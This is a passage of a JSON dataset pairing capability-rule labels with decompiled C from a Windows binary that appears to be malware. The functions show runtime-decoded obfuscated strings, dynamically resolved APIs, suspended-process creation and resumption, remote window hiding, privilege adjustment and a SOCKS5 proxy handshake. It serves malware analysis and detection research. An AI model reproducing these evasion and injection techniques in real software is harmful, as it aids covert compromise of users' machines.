(!bVar1) {\n        return false;\n    }\n    param_2 = param_2 + 1;\n    goto code_r0x0041a29f;\n}\n",
        "token_count": 419
    },
    "0041a47f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0041a47f(char param_1, int32_t param_2)\n\n{\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    if (param_2 == 0) {\n        iStack4 = 0;\n    }\n    else {\n        iStack4 = 0;\n        for (iStack8 = 0; *(param_2 + iStack8) != '\\0'; iStack8 = iStack8 + 1) {\n            if (*(param_2 + iStack8) == param_1) {\n                iStack4 = iStack4 + 1;\n            }\n        }\n    }\n    return iStack4;\n}\n",
        "token_count": 151
    },
    "0041a4de": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0041a4de(char param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iStack4;\n    \n    if (param_2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        for (iStack4 = 0; *(param_2 + iStack4) != '\\0'; iStack4 = iStack4 + 1) {\n            if (*(param_2 + iStack4) == param_1) {\n                return iStack4 + 1;\n            }\n        }\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 144
    },
    "0041a682": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.0041a682(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uStack8;\n    uint32_t uStack4;\n    \n    fcn.0041a59f(param_2, 0, param_3);\n    if (param_1 == 0) {\n        uStack8 = 0xffffffff;\n    }\n    else {\n        uStack8 = 0xffffffff;\n        for (uStack4 = 0; (*(param_1 + uStack4) != '\\0' && (uStack4 < param_3)); uStack4 = uStack4 + 1) {\n            if ((*(param_1 + uStack4) == '\\\\') || (*(param_1 + uStack4) == '/')) {\n                uStack8 = uStack4;\n            }\n            *(uStack4 + param_2) = *(param_1 + uStack4);\n        }\n        *(param_2 + uStack8 + 1) = 0;\n    }\n    return uStack8;\n}\n",
        "token_count": 237
    },
    "0041a73f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041a73f(int32_t param_1, uint param_2, uint32_t param_3)\n\n{\n    uint uVar1;\n    uint32_t uStack8;\n    uint32_t uStack4;\n    \n    fcn.0041a59f(param_2, 0, param_3);\n    if (param_1 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uStack8 = 0xffffffff;\n        for (uStack4 = 0; (*(param_1 + uStack4) != '\\0' && (uStack4 < param_3)); uStack4 = uStack4 + 1) {\n            if ((*(param_1 + uStack4) == '\\\\') || (*(param_1 + uStack4) == '/')) {\n                uStack8 = uStack4;\n            }\n        }\n        uVar1 = fcn.00419918(param_2, uStack8 + 1 + param_1, param_3);\n    }\n    return uVar1;\n}\n",
        "token_count": 233
    },
    "0041a7f6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041a7f6(int32_t param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    \n    fcn.0041a59f(param_2, 0, param_3);\n    if (param_1 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uStack16 = 0;\n        uStack20 = 0;\n        while( true ) {\n            uVar2 = sub.msvcrt.dll_strlen(param_1);\n            if (uVar2 <= uStack20) break;\n            if ((*(uStack20 + param_1) == '\\\\') || (*(uStack20 + param_1) == '/')) {\n                uStack16 = uStack20;\n            }\n            uStack20 = uStack20 + 1;\n        }\n        param_1 = uStack16 + 1 + param_1;\n        uStack16 = 0;\n        uStack20 = 0;\n        while( true ) {\n            uVar2 = sub.msvcrt.dll_strlen(param_1);\n            if (uVar2 <= uStack20) break;\n            if (*(uStack20 + param_1) == '.') {\n                uStack16 = uStack20;\n            }\n            uStack20 = uStack20 + 1;\n        }\n        if (uStack16 == 0) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            uVar1 = fcn.00419918(param_2, param_1 + uStack16 + 1, param_3);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 380
    },
    "0041a907": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041a907(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uchar uVar2;\n    char *pcVar3;\n    uchar auStack292 [256];\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    uint32_t uStack16;\n    \n    if (param_1 != param_2) {\n        fcn.0041a59f(param_2, 0, param_3);\n        uStack16 = 0;\n        iStack20 = 0;\n        while ((*(iStack20 + param_1) != '\\0' && (uStack16 < param_3))) {\n            while (((*(iStack20 + param_1) != '\\0' && (*(iStack20 + param_1) != '%')) && (uStack16 < param_3))) {\n                *(uStack16 + param_2) = *(iStack20 + param_1);\n                iStack20 = iStack20 + 1;\n                uStack16 = uStack16 + 1;\n            }\n            if (*(iStack20 + param_1) == '%') {\n                iStack28 = iStack20 + 1;\n                iStack32 = iStack20;\n                uStack24 = 0;\n                fcn.0041a59f(auStack292, 0, 0x100);\n                while (((uVar1 = uStack24,  *(param_1 + iStack28) != '%' && (*(param_1 + iStack28) != '\\0')) &&\n                       (uStack24 < 0x100))) {\n                    iStack20 = iStack28 + 1;\n                    uStack24 = uStack24 + 1;\n                    pcVar3 = param_1 + iStack28;\n                    iStack28 = iStack28 + 1;\n                    uVar2 = fcn.0041a431(*pcVar3);\n                    auStack292[uVar1] = uVar2;\n                }\n                if (*(param_1 + iStack28) == '\\0') {\n                    while (((iStack20 = iStack32 + 1,  *(iStack20 + param_1) != '\\0' && (*(iStack20 + param_1) != '%'))\n                           && (uStack16 < param_3))) {\n                        *(uStack16 + param_2) = *(iStack20 + param_1);\n                        uStack16 = uStack16 + 1;\n                        iStack32 = iStack20;\n                    }\n                }\n                else if (*(param_1 + iStack28) == '%') {\n                    iStack36 = sub.msvcrt.dll_getenv(auStack292);\n                    if (iStack36 == 0) {\n                        *(uStack16 + param_2) = *(iStack32 + param_1);\n                        while( true ) {\n                            uStack16 = uStack16 + 1;\n                            iStack20 = iStack32 + 1;\n                            if (((*(iStack20 + param_1) == '\\0') || (*(iStack20 + param_1) == '%')) ||\n                               (param_3 <= uStack16)) break;\n                            *(uStack16 + param_2) = *(iStack20 + param_1);\n                            iStack32 = iStack20;\n                        }\n                    }\n                    else {\n                        iStack28 = 0;\n                        while ((*(iStack36 + iStack28) != '\\0' && (uStack16 < param_3))) {\n                            *(uStack16 + param_2) = *(iStack36 + iStack28);\n                            iStack28 = iStack28 + 1;\n                            uStack16 = uStack16 + 1;\n                        }\n                        iStack20 = iStack20 + 1;\n                    }\n                }\n            }\n        }\n        for (uStack16 = 0; uStack16 < param_3; uStack16 = uStack16 + 1) {\n            if (*(uStack16 + param_2) == '/') {\n                *(uStack16 + param_2) = 0x5c;\n            }\n        }\n        *(param_2 + (param_3 - 1)) = 0;\n    }\n    return;\n}\n",
        "token_count": 943
    },
    "0041ad97": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0041ad97(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    if (param_2 == 0) {\n        iVar5 = 0;\n    }\n    else {\n        iVar5 = sub.msvcrt.dll_calloc(param_2 * 3, 1);\n        if (iVar5 == 0) {\n            iVar5 = 0;\n        }\n        else {\n            iStack20 = 0;\n            for (iStack16 = 0; iStack16 < param_2; iStack16 = iStack16 + 1) {\n                uVar2 = *(param_1 + iStack16) >> 4;\n                uVar3 = *(param_1 + iStack16) & 0xf;\n                if (uVar2 < 10) {\n                    cVar4 = '0';\n                }\n                else {\n                    cVar4 = '7';\n                }\n                *(iStack20 + iVar5) = cVar4 + uVar2;\n                iVar1 = iStack20 + 2;\n                if (uVar3 < 10) {\n                    cVar4 = '0';\n                }\n                else {\n                    cVar4 = '7';\n                }\n                *(iStack20 + 1 + iVar5) = cVar4 + uVar3;\n                iStack20 = iStack20 + 3;\n                *(iVar5 + iVar1) = 0x20;\n            }\n            *(iVar5 + iStack20 + -1) = 0;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 392
    },
    "0041afae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041afae(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uStack28;\n    int32_t iStack24;\n    code *pcStack20;\n    uint uStack16;\n    \n    uStack16 = 0;\n    uVar1 = fcn.0040b60e(\"CS2Cs4Nh.Sii\");\n    uStack16 = fcn.0040b4e9(uVar1);\n    uVar1 = fcn.0040b60e(\"Ed5u6d0LCldD\");\n    pcStack20 = fcn.0040b4ff(uStack16, uVar1);\n    uVar1 = fcn.0040b60e(\"uMjrLDFj\");\n    iStack24 = sub.msvcrt.dll_getenv(uVar1);\n    if (iStack24 == 0) {\n        uStack28 = param_2;\n        iVar2 = (*pcStack20)(param_1, &uStack28);\n        if (iVar2 != 0) {\n            return;\n        }\n        fcn.00419918(param_1, \"Unknown\", param_2);\n    }\n    else {\n        fcn.00419918(param_1, iStack24, param_2);\n    }\n    fcn.0040b51d(uStack16);\n    return;\n}\n",
        "token_count": 305
    },
    "0041b0ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041b0ec(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uStack372;\n    uint uStack368;\n    uchar *puStack364;\n    char *pcStack360;\n    char *pcStack356;\n    uchar *puStack352;\n    uchar *puStack348;\n    uchar *puStack344;\n    uint uStack340;\n    uint32_t uStack292;\n    uint uStack284;\n    uchar auStack264 [4];\n    uint uStack260;\n    uint uStack244;\n    uchar auStack240 [4];\n    uint32_t uStack236;\n    int32_t iStack232;\n    int16_t iStack228;\n    uint uStack224;\n    uint uStack220;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    int32_t iStack176;\n    char cStack172;\n    int32_t iStack84;\n    uint uStack80;\n    int16_t iStack40;\n    char cStack38;\n    uint uStack28;\n    char cStack21;\n    uchar uStack18;\n    uchar uStack13;\n    \n    uStack13 = 1;\n    uStack220 = 0;\n    uStack224 = 0;\n    uStack340 = 0x9c;\n    puStack344 = NULL;\n    puStack348 = &stack0xffffff4c;\n    puStack352 = 0x41b12d;\n    fcn.0041a59f();\n    uStack180 = 0x9c;\n    puStack348 = &stack0xffffff4c;\n    puStack352 = 0x41b147;\n    iVar2 = sub.KERNEL32.dll_GetVersionExA();\n    uStack18 = iVar2 != 0;\n    if (!uStack18) {\n        iStack184 = 0x94;\n        puStack352 = &stack0xffffff48;\n        pcStack356 = 0x41b17f;\n        iVar2 = sub.KERNEL32.dll_GetVersionExA();\n        cStack21 = iVar2 == 0;\n    }\n    if (cStack21 != '\\x01') {\n        return 0;\n    }\n    pcStack356 = \"Ed5LC542dMZ65dlXR8W\";\n    pcStack360 = 0x41b1b3;\n    uVar3 = fcn.0040b60e();\n    pcStack356 = \"wd0RdiNh.Sii\";\n    pcStack360 = 0x41b1c1;\n    pcStack356 = fcn.0040b60e();\n    pcStack360 = 0x41b1c9;\n    pcStack356 = fcn.0040b4e9();\n    pcStack360 = 0x41b1d5;\n    puStack352 = uVar3;\n    uStack28 = fcn.0040b4ff();\n    if (uStack28 == NULL) {\n        pcStack356 = &stack0xffffff20;\n        pcStack360 = 0x41b20d;\n        sub.KERNEL32.dll_GetSystemInfo();\n    }\n    else {\n        pcStack356 = &stack0xffffff20;\n        pcStack360 = 0x41b1f9;\n        (*uStack28)();\n    }\n    if (uStack28._2_1_ == '\\0') {\n        uStack244 = 0x50;\n        pcStack360 = \"MvMqjF\\\\PQ00dR5PWR50WiMd5\\\\PWR50Wi\\\\90WSQY5Ts54WR6\";\n        puStack364 = 0x41b4eb;\n        pcStack356 = fcn.0040b60e();\n        puStack344 = &stack0xffffff10;\n        puStack348 = 0x1;\n        puStack352 = NULL;\n        pcStack360 = 0x80000002;\n        puStack364 = 0x41b513;\n        iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iVar2 != 0) {\n            return 0;\n        }\n        uVar3 = fcn.0040b60e(\"90WSQY5qZsd\");\n        pcStack360 = &stack0xfffffef8;\n        puStack364 = &stack0xfffffea8;\n        uStack368 = 0;\n        uStack372 = 0;\n        uStack80 = sub.ADVAPI32.DLL_RegQueryValueExA(uStack260, uVar3);\n        sub.ADVAPI32.DLL_RegCloseKey(uStack284);\n        if ((iStack84 != 0) || (0x50 < uStack292)) {\n            return 0;\n        }\n        uVar3 = fcn.0040b60e(\"UXLLq\");\n        iVar2 = fcn.0041a1d8(uVar3, &stack0xfffffe8c);\n        if ((iVar2 == 0) && (uStack236 < 5)) {\n            return 8;\n        }\n        uVar3 = fcn.0040b60e(\"mDLFDLLq\");\n        iVar2 = fcn.0041a1d8(uVar3, &stack0xfffffe8c);\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040b60e(\"MjrzjrLq\");\n            iVar2 = fcn.0041a1d8(uVar3, &stack0xfffffe8c);\n            if (iVar2 != 0) {\n                return 0;\n            }\n        }\n        if ((uStack236 == 5) && (iStack232 == 2)) {\n            return 0xe;\n        }\n        if ((uStack236 == 5) && (iStack232 == 0)) {\n            return 0x500;\n        }\n        if (uStack236 < 5) {\n            return 8;\n        }\n    }\n    else if (iStack176 == 1) {\n        if (iStack188 == 4) {\n            if (iStack184 == 10) {\n                if (cStack172 != 'A') {\n                    return 0x410;\n                }\n                return 5;\n            }\n            if (iStack184 == 0x5a) {\n                return 6;\n            }\n            if (iStack184 == 0) {\n                if ((cStack172 != 'B') && (cStack172 != 'C')) {\n                    return 0x400;\n                }\n                return 3;\n            }\n        }\n    }\n    else {\n        if (iStack176 == 0) {\n            return 1;\n        }\n        if (iStack176 == 2) {\n            if (iStack188 == 4) {\n                if (cStack38 == '\\x01') {\n                    return 8;\n                }\n                if (cStack38 == '\\x03') {\n                    return 9;\n                }\n            }\n            else if (iStack188 == 5) {\n                if (iStack184 == 1) {\n                    return 0x501;\n                }\n                if (iStack184 == 0) {\n                    return 0x500;\n                }\n                if (iStack184 == 2) {\n                    if (iStack40 == -0x8000) {\n                        return 0xd;\n                    }\n                    if ((cStack38 == '\\x01') && (iStack228 == 9)) {\n                        return 0xc;\n                    }\n                    pcStack360 = 0x59;\n                    puStack364 = 0x41b38f;\n                    iVar2 = sub.USER32.dll_GetSystemMetrics();\n                    if (iVar2 != 0) {\n                        return 0xf;\n                    }\n                    return 0xe;\n                }\n            }\n            else if (iStack188 == 3) {\n                return 7;\n            }\n            pcStack356 = &stack0xffffff14;\n            pcStack360 = &stack0xffffff18;\n            puStack364 = 0x41b3c1;\n            cVar1 = fcn.0041b081();\n            if ((cVar1 != '\\0') && (iStack232 == 6)) {\n                if (uStack236 == 0) {\n                    if (cStack38 != '\\x01') {\n                        return 0x11;\n                    }\n                    return 0x600;\n                }\n                if (uStack236 == 1) {\n                    if (cStack38 != '\\x01') {\n                        return 0x13;\n                    }\n                    return 0x12;\n                }\n                if (uStack236 == 2) {\n                    if (cStack38 != '\\x01') {\n                        return 0x16;\n                    }\n                    return 0x14;\n                }\n                if (uStack236 == 3) {\n                    if (cStack38 != '\\x01') {\n                        return 0x18;\n                    }\n                    return 0x15;\n                }\n            }\n            pcStack356 = &stack0xffffff14;\n            pcStack360 = &stack0xffffff18;\n            puStack364 = 0x41b493;\n            cVar1 = fcn.0041b081();\n            if (((cVar1 != '\\0') && (iStack232 == 10)) && (uStack236 == 0)) {\n                if (cStack38 != '\\x01') {\n                    return 0x19;\n                }\n                return 0x17;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 2070
    },
    "0041b697": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041b697(uint *param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    code *pcStack16;\n    \n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    *param_1 = 0;\n    param_1[1] = 0;\n    uVar1 = sub.KERNEL32.dll_GetTickCount();\n    *param_1 = uVar1;\n    param_1[1] = 0;\n    uVar1 = fcn.0040b60e(\"EiWVCiFdlW0ZM5C5Q6jf\");\n    uVar2 = fcn.0040b4e9(\"kernel32.dll\");\n    pcStack16 = fcn.0040b4ff(uVar2, uVar1);\n    if (pcStack16 != NULL) {\n        uStack84 = 0x40;\n        iVar3 = (*pcStack16)(&uStack84);\n        if (iVar3 != 0) {\n            *(unaff_retaddr + 8) = uStack80;\n            *(unaff_retaddr + 0xc) = uStack76;\n            *(unaff_retaddr + 0x10) = uStack72;\n            *(unaff_retaddr + 0x14) = uStack68;\n        }\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "0041b7b3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.0041b7b3(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uStack100;\n    uchar *puVar5;\n    uint uStack84;\n    code *pcStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    code *pcStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uchar auStack36 [6];\n    uchar uStack30;\n    uchar uStack29;\n    uchar uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    int32_t iStack24;\n    int32_t iStack20;\n    code *pcStack16;\n    \n    uStack30 = 0;\n    uStack29 = 0;\n    uStack28 = 0;\n    uStack27 = 0;\n    uStack26 = 0;\n    uStack25 = 5;\n    uVar1 = fcn.0040b60e(\"DiiWYC5dDRSXR454Ci4kdM4S\");\n    uVar2 = fcn.0040b4e9(\"advapi32.dll\");\n    pcStack16 = fcn.0040b4ff(uVar2, uVar1);\n    uVar1 = fcn.0040b60e(\"PIdYwqWwdRFdlVd06I4s\");\n    uVar2 = fcn.0040b4e9(\"advapi32.dll\");\n    iStack20 = fcn.0040b4ff(uVar2, uVar1);\n    uVar1 = fcn.0040b60e(\"_0ddM4S\");\n    uVar2 = fcn.0040b4e9(\"advapi32.dll\");\n    iStack24 = fcn.0040b4ff(uVar2, uVar1);\n    if (((pcStack16 == NULL) || (iStack20 == 0)) || (iStack24 == 0)) {\n        uVar3 = 0;\n    }\n    else {\n        puStack52 = auStack36;\n        uStack56 = 0;\n        uStack60 = 0;\n        pcStack64 = NULL;\n        uStack68 = 0;\n        uStack72 = 0;\n        uStack76 = 0;\n        pcStack80 = 0x220;\n        uStack84 = 0x20;\n        puVar5 = &uStack30;\n        iVar4 = (*pcStack16)(puVar5, 2);\n        if (iVar4 == 0) {\n            uVar3 = 0;\n        }\n        else {\n            (*pcStack64)(0, pcStack80, &uStack84);\n            (*pcStack80)(puVar5);\n            uVar3 = uStack100 & 0xffffff00 | uStack100 != 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 660
    },
    "0041c954": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c954(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar auStack96 [32];\n    uint uStack64;\n    uint uStack40;\n    uchar auStack36 [8];\n    uchar auStack28 [28];\n    \n    cVar1 = fcn.0040aa34(param_2);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040b20d(param_2);\n        if (cVar1 != '\\0') {\n            fcn.0041a59f(auStack96, 0, 0x44);\n            fcn.0041a59f(auStack28, 0, 0x10);\n            iVar2 = sub.KERNEL32.dll_CreateProcessA(0, param_2, 0, 0, 0, 4, 0, 0, auStack96, auStack28);\n            if (iVar2 != 0) {\n                fcn.0040cb3e();\n                fcn.00408d8a(auStack36);\n                iVar2 = sub.KERNEL32.dll_ResumeThread(uStack64);\n                if (iVar2 == 1) {\n    // WARNING: Subroutine does not return\n                    sub.KERNEL32.dll_ExitProcess(0);\n                }\n                fcn.0040caf6();\n            }\n        }\n    }\n    fcn.00408b8f(uStack40, 0x9e, 0, 0);\n    return;\n}\n",
        "token_count": 342
    },
    "0041cc5e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cc5e(uint param_1, int32_t param_2)\n\n{\n    if (param_2 == 2) {\n        sub.USER32.dll_ShowWindow(param_1, 5);\n    }\n    else if (param_2 == 3) {\n        sub.USER32.dll_SendMessageA(param_1, 0x10, 0, 0);\n    }\n    else if (param_2 == 1) {\n        sub.USER32.dll_ShowWindow(param_1, 0);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "0041ccf4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041ccf4(char *param_1)\n\n{\n    uint uVar1;\n    uchar auStack288 [256];\n    uchar auStack32 [16];\n    int32_t iStack16;\n    \n    iStack16 = *param_1;\n    param_1 = param_1 + 1;\n    if (iStack16 == 2) {\n        uVar1 = fcn.00419d08(param_1);\n        fcn.0041cc5e(uVar1, 1);\n    }\n    else if (iStack16 < 3) {\n        if (iStack16 == 1) {\n            uVar1 = fcn.00419d08(param_1);\n            fcn.0041cc5e(uVar1, 3);\n        }\n    }\n    else if (iStack16 == 3) {\n        uVar1 = fcn.00419d08(param_1);\n        fcn.0041cc5e(uVar1, 2);\n    }\n    else if (iStack16 == 4) {\n        fcn.00419a6a(param_1, 7, 1, auStack32, 0x10);\n        fcn.00419a6a(param_1, 7, 2, auStack288, 0x100);\n        uVar1 = fcn.00419d08(auStack32);\n        fcn.0041ccd5(uVar1, auStack288);\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "0040832e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040832e(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puVar3;\n    ushort uStack570;\n    uchar auStack567 [4];\n    uchar uStack563;\n    uint8_t auStack562 [4];\n    uchar auStack558 [493];\n    uint8_t uStack65;\n    char cStack51;\n    char cStack50;\n    uint8_t uStack49;\n    uint32_t uStack48;\n    uint32_t uStack32;\n    uint uStack24;\n    uint32_t uStack20;\n    uchar uStack16;\n    uchar uStack15;\n    \n    uStack20 = CONCAT13(5, uStack20);\n    uStack16 = 1;\n    uStack15 = 0;\n    iVar1 = sub.WS2_32.dll_send();\n    if (iVar1 == (uStack32 & 0xff) + 2) {\n        fcn.0041a59f();\n        iVar1 = sub.WS2_32.dll_recv();\n        if (iVar1 == 2) {\n            if ((cStack51 == '\\x05') && (cStack50 == '\\0')) {\n                auStack562[3] = sub.msvcrt.dll_strlen(uStack24);\n                uStack48 = uStack48 & 0xffffff | auStack562[3] << 0x18;\n                if (auStack562[3] + 7 < 0x201) {\n                    uStack563 = 5;\n                    auStack562[0] = 1;\n                    auStack562[1] = 0;\n                    auStack562[2] = 3;\n                    fcn.0041a5e1(auStack558);\n                    uStack570 = sub.WS2_32.dll_htons(uStack20 & 0xffff);\n                    fcn.0041a5e1(auStack562 + uStack49, &uStack570);\n                    iVar1 = sub.WS2_32.dll_send(uStack32, auStack567);\n                    if (iVar1 == uStack65 + 7) {\n                        puVar3 = &stack0xfffffbb6;\n                        iVar1 = sub.WS2_32.dll_recv(uStack48, puVar3, uStack65 + 7, 0);\n                        if (iVar1 < 0) {\n                            uVar2 = 0;\n                        }\n                        else if ((puVar3 >> 0x10 == '\\x05') && (puVar3 >> 0x18 == '\\0')) {\n                            uVar2 = 1;\n                        }\n                        else {\n                            uVar2 = 0;\n                        }\n                    }\n                    else {\n                        uVar2 = 0;\n                    }\n                }\n                else {\n                    uVar2 = 0;\n                }\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 666
    },
    "00408754": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00408754(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack44;\n    uint uStack32;\n    uchar auStack28 [24];\n    \n    uStack32 = 0xffffffff;\n    uStack64 = 0x408765;\n    iVar2 = fcn.0040cf99();\n    if (iVar2 == 4) {\n        if (*0x424308 == 0) {\n            *0x424308 = *0x424304;\n        }\n        for (; *0x424308 != 0; *0x424308 = *(*0x424308 + 0x88)) {\n            cVar1 = fcn.00407c90(*0x424308 + 4);\n            if (cVar1 != '\\0') {\n                uVar3 = sub.WS2_32.dll_socket(2);\n                iVar2 = sub.WS2_32.dll_connect(uVar3, &stack0xffffffc0, 0x10);\n                if ((iVar2 == 0) && (cVar1 = fcn.004086b4(),  cVar1 != '\\0')) {\n                    *0x424308 = *(*0x424308 + 0x88);\n                    do {\n                        if (*0x424308 == 0) {\n                            return uStack56;\n                        }\n                        if (*(*0x424308 + 0x88) == 0) {\n                            cVar1 = fcn.004086b4();\n                            if (cVar1 != '\\x01') {\n                                fcn.00408d8a();\n                                return 0xffffffff;\n                            }\n                        }\n                        else {\n                            cVar1 = fcn.004086b4();\n                            if (cVar1 != '\\x01') {\n                                fcn.00408d8a();\n                                return 0xffffffff;\n                            }\n                        }\n                        *0x424308 = *(*0x424308 + 0x88);\n                    } while( true );\n                }\n                fcn.00408d8a();\n            }\n        }\n    }\n    else {\n        uStack64 = 0x408956;\n        iVar2 = fcn.0040cf99();\n        if (iVar2 == 2) {\n            if (*0x424308 == 0) {\n                *0x424308 = *0x424304;\n            }\n            for (; *0x424308 != 0; *0x424308 = *(*0x424308 + 0x88)) {\n                cVar1 = fcn.00407c90(*0x424308 + 4);\n                if (cVar1 != '\\0') {\n                    uVar3 = sub.WS2_32.dll_socket(2);\n                    iVar2 = sub.WS2_32.dll_connect(uVar3, &stack0xffffffc0, 0x10);\n                    if 